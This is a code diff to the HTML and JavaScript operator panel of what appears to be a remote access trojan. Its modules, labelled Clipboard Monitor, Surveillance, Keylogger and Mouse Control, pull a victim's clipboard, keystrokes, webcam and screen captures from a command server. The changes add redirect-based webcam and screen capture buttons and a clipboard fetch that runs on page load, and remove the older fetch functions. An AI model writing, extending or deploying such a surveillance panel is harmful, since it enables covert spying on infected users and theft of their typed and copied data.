@@ -19,6 +19,8 @@
         }
         
         body {
+            width:100%;
+            height: 100vh;
             background-color: var(--dark-bg);
             color: white;
             font-family: 'Courier New', monospace;
@@ -97,8 +99,25 @@
             font-weight: 900;
             letter-spacing: 5px;
             font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+            animation:7s ani linear infinite;
+        }
+
+        @keyframes ani {
+           50%{
+            background-color: #530909;
+           }
+
+           90%{
+            background-color: #ff4444;
+           }
+
+           100%{
+            background-color: #000000;
+           }
         }
     main {
+        width:100%;
+        height: 100vh;
       display: none;
     }
   </style>
@@ -133,7 +152,7 @@
                     </form>
                 </div>
 
-                <!-- File Upload Module -->
+              
                 <div class="module">
                     <h3 class="module-title"><i class="fas fa-file-upload"></i> File Upload</h3>
                     <form id="uploadForm" enctype="multipart/form-data">
@@ -145,11 +164,11 @@
                     <div id="uploadStatus" class="mt-2 text-muted"></div>
                 </div>
 
-                <!-- Clipboard Module -->
+             
                 <div class="module">
                     <h3 class="module-title"><i class="fas fa-clipboard"></i> Clipboard Monitor</h3>
                     <div class="terminal" id="clipboardContent">
-                        No clipboard data available
+                        
                     </div>
                     <button id="refreshClipboard" class="btn btn-success mt-2 w-100">
                         <i class="fas fa-sync-alt"></i> Refresh Clipboard
@@ -162,10 +181,10 @@
                 <div class="module">
                     <h3 class="module-title"><i class="fas fa-eye"></i> Surveillance</h3>
                     <div class="d-flex gap-2 mb-3">
-                        <button id="captureWebcam" class="btn btn-danger flex-grow-1">
-                            <i class="fas fa-camera"></i> Capture Webcam
+                        <button id="captureWebcam" class="btn btn-danger flex-grow-1" onclick="redirectshowCAM()" >
+                           <i class="fas fa-camera"></i> Capture Webcam
                         </button>
-                        <button id="captureScreen" class="btn btn-danger flex-grow-1">
+                        <button id="captureScreen" class="btn btn-danger flex-grow-1" onclick="redirectshow()">
                             <i class="fas fa-desktop"></i> Capture Screen
                         </button>
 
@@ -195,7 +214,6 @@
                     </div>
                 </div>
 
-                <!-- Mouse Control Module -->
                 <div class="module">
                     <h3 class="module-title"><i class="fas fa-mouse-pointer"></i> Mouse Control</h3>
                     <div class="row g-2">
@@ -256,7 +274,7 @@ async function initializeApp() {
      
         updateInitStatus("Initializing modules...");
         await Promise.all([
-            updateClipboard(),
+           
             updateKeystrokes()
         ]);
 
@@ -272,6 +290,15 @@ async function initializeApp() {
     }
 }
 
+
+function redirectshow(){
+    window.location.href= `${API_BASE}/im/hello1324`
+}
+
+
+function redirectshowCAM(){
+    window.location.href = `${API_BASE}/capture`
+}
 
 function updateInitStatus(message) {
     if (initStatusElement) {
@@ -374,73 +401,17 @@ async function uploadFile(file) {
     }
 }
 
-async function updateClipboard() {
-    if (!isInitialized) return;
 
-    const clipboardElement = document.getElementById("clipboardContent");
-    clipboardElement.innerHTML = '<span class="text-muted">[Refreshing...]</span>';
+window.addEventListener("load" , seeclip)
 
-    try {
-        const response = await fetch(`${API_BASE}/seeclip`);
-        if (!response.ok) {
-            throw new Error(`Failed to fetch clipboard: ${response.status}`);
-        }
-
-        const data = await response.json();
-        clipboardElement.textContent = data.ClipBoard || data.Error || "No clipboard data available";
-    } catch (error) {
-        console.error("Clipboard error:", error);
-        clipboardElement.innerHTML = `<span class="text-danger">Error: ${error.message}</span>`;
-    }
+function seeclip(){
+    let clipboardContent = document.getElementById("clipboardContent")
+    fetch(`${API_BASE}/seeclip`).then(res=>res.json()).then(data=>clipboardContent.innerHTML=data["ClipBoard"]).catch(err=>clipboardContent.innerHTML="Unble to Fetch Clipborad")
 }
 
 
-async function captureWebcam() {
-    if (!isInitialized) return;
 
-    try {
-        setLoadingState(true);
-        const response = await fetch(`${API_BASE}/capture`);
-        if (!response.ok) {
-            throw new Error(`Capture failed: ${response.status}`);
-        }
 
-        const img = document.getElementById("surveillanceImage");
-        img.src = `${API_BASE}/get-img`;
-        img.style.display = 'block';
-        document.getElementById("noImage").style.display = 'none';
-    } catch (error) {
-        console.error("Webcam error:", error);
-        showErrorAlert("Capture Failed", error.message);
-    } finally {
-        setLoadingState(false);
-    }
-}
-
-async function captureScreen() {
-    if (!isInitialized) return;
-
-    try {
-        setLoadingState(true);
-        const response = await fetch(`${API_BASE}/im/hello1324`);
-        if (!response.ok) {
-            throw new Error(`Screen capture failed: ${response.status}`);
-        }
-
-        const data = await response.json();
-        if (data.URL) {
-            const img = document.getElementById("surveillanceImage");
-            img.src = data.URL;
-            img.style.display = 'block';
-            document.getElementById("noImage").style.display = 'none';
-        }
-    } catch (error) {
-        console.error("Screen capture error:", error);
-        showErrorAlert("Capture Failed", error.message);
-    } finally {
-        setLoadingState(false);
-    }
-}
 
 async function updateKeystrokes() {
     if (!isInitialized) return;
@@ -519,11 +490,10 @@ function setupEventListeners() {
     });
 
     // Clipboard
-    document.getElementById('refreshClipboard')?.addEventListener('click', updateClipboard);
+
 
     // Surveillance
-    document.getElementById('captureWebcam')?.addEventListener('click', captureWebcam);
-    document.getElementById('captureScreen')?.addEventListener('click', captureScreen);
+ 
 
     // Keylogger
     document.getElementById('refreshKeystrokes')?.addEventListener('click', updateKeystrokes);
